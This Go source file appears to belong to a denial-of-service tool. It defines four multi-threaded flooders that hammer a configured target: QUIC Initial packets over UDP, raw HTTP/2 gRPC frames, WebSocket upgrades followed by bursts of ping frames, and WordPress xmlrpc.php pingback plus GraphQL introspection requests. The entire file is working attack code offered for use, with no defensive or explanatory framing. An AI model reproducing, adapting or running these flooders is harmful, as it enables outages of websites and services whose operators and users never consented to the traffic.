package main

import (
	"crypto/rand"
	"fmt"
	"net"
	"sync/atomic"
	"time"
)

type QUICFlooder struct {
	target  string
	port    int
	workers int
	sent    atomic.Int64
}

func NewQUICFlooder(cfg *AttackConfig) *QUICFlooder {
	w := cfg.Workers / 4
	if w < 64 { w = 64 }
	if w > 1024 { w = 1024 }
	return &QUICFlooder{
		target:  cfg.Target,
		port:    cfg.Port,
		workers: w,
	}
}

func (q *QUICFlooder) Run(done chan struct{}) {
	addr := fmt.Sprintf("%s:%d", q.target, q.port)
	raddr, err := net.ResolveUDPAddr("udp", addr)
	if err != nil { return }

	for i := 0; i < q.workers; i++ {
		go func() {
			conn, err := net.DialUDP("udp", nil, raddr)
			if err != nil { return }
			defer conn.Close()

			for {
				select {
				case <-done:
					return
				default:
				}
				pkt := buildQUICInitial()
				conn.Write(pkt)
				q.sent.Add(1)
			}
		}()
	}
}

func buildQUICInitial() []byte {
	buf := make([]byte, 1200)

	buf[0] = 0xC0

	srcConnID := make([]byte, 8)
	rand.Read(srcConnID)
	buf[1] = 0
	buf[2] = 0
	buf[3] = 0
	buf[4] = 0
	off := 5
	buf[off] = byte(len(srcConnID))
	off++
	copy(buf[off:], srcConnID)
	off += len(srcConnID)

	dstConnID := make([]byte, 8)
	rand.Read(dstConnID)
	buf[off] = byte(len(dstConnID))
	off++
	copy(buf[off:], dstConnID)
	off += len(dstConnID)

	buf[off] = 0
	off++

	payloadLen := 1200 - off
	buf[off] = byte(payloadLen >> 8)
	off++
	buf[off] = byte(payloadLen)
	off++

	pktNum := make([]byte, 4)
	rand.Read(pktNum)
	copy(buf[off:], pktNum)
	off += 4

	for i := off; i < 1200; i++ {
		buf[i] = byte(time.Now().UnixNano() & 0xFF)
	}

	return buf[:1200]
}

func (q *QUICFlooder) Stats() (sent, errors int64) {
	return q.sent.Load(), 0
}

var _ = NewQUICFlooder
var _ = (*QUICFlooder).Stats

type GRPCFlooder struct {
	target  string
	port    int
	workers int
	sent    atomic.Int64
	errors  atomic.Int64
}

func NewGRPCFlooder(cfg *AttackConfig) *GRPCFlooder {
	w := cfg.Workers / 4
	if w < 64 { w = 64 }
	if w > 1024 { w = 1024 }
	return &GRPCFlooder{
		target:  cfg.Target,
		port:    cfg.Port,
		workers: w,
	}
}

func (g *GRPCFlooder) Run(done chan struct{}) {
	addr := fmt.Sprintf("%s:%d", g.target, g.port)
	for i := 0; i < g.workers; i++ {
		go func() {
			for {
				select {
				case <-done:
					return
				default:
				}
				conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
				if err != nil {
					g.errors.Add(1)
					continue
				}
				conn.Write(buildGRPCUnaryFrame())
				conn.Close()
				g.sent.Add(1)
			}
		}()
	}
}

func buildGRPCUnaryFrame() []byte {
	var buf []byte

	buf = append(buf, "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"...)
	settings := []byte{0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00}
	buf = append(buf, settings...)

	headers := ":method POST\r\n:scheme http\r\n:path /grpc.reflection.V1Alpha/ServerReflectionInfo\r\n:authority localhost\r\ncontent-type application/grpc\r\n\r\n"
	hf := make([]byte, 9+len(headers))
	hf[0] = 0x00
	hf[1] = 0x00
	hf[2] = byte(len(headers))
	hf[3] = 0x01
	hf[4] = 0x04
	hf[6] = 0x00
	hf[7] = 0x00
	hf[8] = 0x01
	copy(hf[9:], headers)
	buf = append(buf, hf...)

	grpcData := []byte{0x00, 0x00, 0x00, 0x00, 0x01}
	df := make([]byte, 9+len(grpcData))
	df[2] = byte(len(grpcData))
	df[3] = 0x00
	df[4] = 0x04
	df[6] = 0x00
	df[7] = 0x00
	df[8] = 0x01
	copy(df[9:], grpcData)
	buf = append(buf, df...)

	return buf
}

func (g *GRPCFlooder) Stats() (sent, errors int64) {
	return g.sent.Load(), g.errors.Load()
}

var _ = NewGRPCFlooder
var _ = (*GRPCFlooder).Stats

type WebSocketFlooder struct {
	target  string
	port    int
	workers int
	sent    atomic.Int64
	errors  atomic.Int64
}

func NewWebSocketFlooder(cfg *AttackConfig) *WebSocketFlooder {
	w := cfg.Workers / 4
	if w < 64 { w = 64 }
	if w > 1024 { w = 1024 }
	return &WebSocketFlooder{
		target:  cfg.Target,
		port:    cfg.Port,
		workers: w,
	}
}

func (ws *WebSocketFlooder) Run(done chan struct{}) {
	addr := fmt.Sprintf("%s:%d", ws.target, ws.port)
	for i := 0; i < ws.workers; i++ {
		go func() {
			for {
				select {
				case <-done:
					return
				default:
				}
				conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
				if err != nil {
					ws.errors.Add(1)
					continue
				}
				key := randStr(16)
				upgrade := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: %s==\r\nSec-WebSocket-Version: 13\r\n\r\n", addr, key)
				conn.Write([]byte(upgrade))

				maskKey := make([]byte, 4)
				rand.Read(maskKey)
				payload := make([]byte, 64)
				rand.Read(payload)
				for i := 0; i < 100; i++ {
					frame := buildWSPing(maskKey, payload)
					if _, err := conn.Write(frame); err != nil {
						break
					}
				}
				conn.Close()
				ws.sent.Add(1)
			}
		}()
	}
}

func buildWSPing(mask []byte, payload []byte) []byte {
	b := make([]byte, 2+4+len(payload))
	b[0] = 0x89
	b[1] = byte(0x80 | len(payload))
	copy(b[2:6], mask)
	for i, p := range payload {
		b[6+i] = p ^ mask[i%4]
	}
	return b
}

func (ws *WebSocketFlooder) Stats() (sent, errors int64) {
	return ws.sent.Load(), ws.errors.Load()
}

var _ = NewWebSocketFlooder
var _ = (*WebSocketFlooder).Stats

type WordPressFlooder struct {
	target  string
	port    int
	workers int
	sent    atomic.Int64
	errors  atomic.Int64
}

func NewWordPressFlooder(cfg *AttackConfig) *WordPressFlooder {
	w := cfg.Workers / 4
	if w < 64 { w = 64 }
	if w > 1024 { w = 1024 }
	return &WordPressFlooder{
		target:  cfg.Target,
		port:    cfg.Port,
		workers: w,
	}
}

func (wp *WordPressFlooder) Run(done chan struct{}) {
	addr := fmt.Sprintf("%s:%d", wp.target, wp.port)
	xmlPayload := `<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://example.com/</string></value></param><param><value><string>http://` + wp.target + `/</string></value></param></params></methodCall>`
	graphqlPayload := `{"query":"query { __schema { types { name fields { name } } } }"}`
	xmlLen := len(xmlPayload)
	graphqlLen := len(graphqlPayload)

	for i := 0; i < wp.workers; i++ {
		go func() {
			for {
				select {
				case <-done:
					return
				default:
				}
				conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
				if err != nil {
					wp.errors.Add(1)
					continue
				}
				req := fmt.Sprintf("POST /xmlrpc.php HTTP/1.1\r\nHost: %s\r\nContent-Type: text/xml\r\nContent-Length: %d\r\n\r\n%s", wp.target, xmlLen, xmlPayload)
				conn.Write([]byte(req))
				conn.Close()

				conn2, err := net.DialTimeout("tcp", addr, 5*time.Second)
				if err != nil {
					wp.errors.Add(1)
					continue
				}
				req2 := fmt.Sprintf("POST /graphql HTTP/1.1\r\nHost: %s\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n%s", wp.target, graphqlLen, graphqlPayload)
				conn2.Write([]byte(req2))
				conn2.Close()
				wp.sent.Add(1)
			}
		}()
	}
}

func (wp *WordPressFlooder) Stats() (sent, errors int64) {
	return wp.sent.Load(), wp.errors.Load()
}

var _ = NewWordPressFlooder
var _ = (*WordPressFlooder).Stats
